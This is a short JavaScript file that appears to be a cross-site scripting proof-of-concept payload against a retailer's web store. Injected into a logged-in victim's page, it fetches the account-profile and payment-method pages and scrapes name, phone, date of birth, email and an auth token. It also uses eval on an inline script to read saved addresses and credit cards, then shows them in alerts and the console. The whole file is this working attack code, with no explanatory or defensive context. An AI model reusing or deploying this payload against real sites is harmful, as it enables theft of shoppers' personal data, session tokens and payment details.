var xhr01 = new XMLHttpRequest();
var xhr02 = new XMLHttpRequest();
xhr01.onload = function() {
	var parser = new DOMParser()
	var response = parser.parseFromString(this.responseText, 'text/html');
	var data01 = [];
	data01.push(document.domain);
	var fields = ["personTitleOld",
	"firstNameOld",
	"lastNameOld",
	"genderOld",
	"phoneNumberOld",
	"dateOfBirthDDOld",
	"dateOfBirthMMOld",
	"dateOfBirthYYOld",
	"emailFieldValue",
	"authToken"];
	for (i = 0; i < fields.length; i++) { 
		var tmp = response.getElementsByName(fields[i]);
		if (tmp.length > 0)
		{
			if (tmp[0].value.length > 0)
			{
				data01.push(fields[i] + " : " + tmp[0].value);
				console.log(fields[i] + " : " + tmp[0].value);
			}
		}
	}
	alert(data01.join('\n'));
}
xhr02.onload = function() {
    var parser = new DOMParser()
    var response = parser.parseFromString(this.responseText, 'text/html');
	var scripts = response.getElementsByTagName("script");
	for (i = 0; i < scripts.length; i++)
	{
		if (scripts[i].innerText.indexOf('dataPayload =') > 1)
		{
			var modifiedScript = scripts[i].innerText.replace("var dataPayload =","window.dataPayload =");
			eval(modifiedScript);
			alert(JSON.stringify(dataPayload.addresses));
			console.log(JSON.stringify(dataPayload.addresses));
			alert(JSON.stringify(dataPayload.creditCards));
			console.log(JSON.stringify(dataPayload.creditCards));
			break;
		}
	}
}
xhr01.open("GET", "/MSAccountProfileDisplayView?catalogId=10051&langId=-24&storeId=10151", false);
xhr01.send();

xhr02.open("GET","/MSUserProfilePaymentMethodDisplayView?catalogId=10051&langId=-24&storeId=10151",false);
xhr02.send();
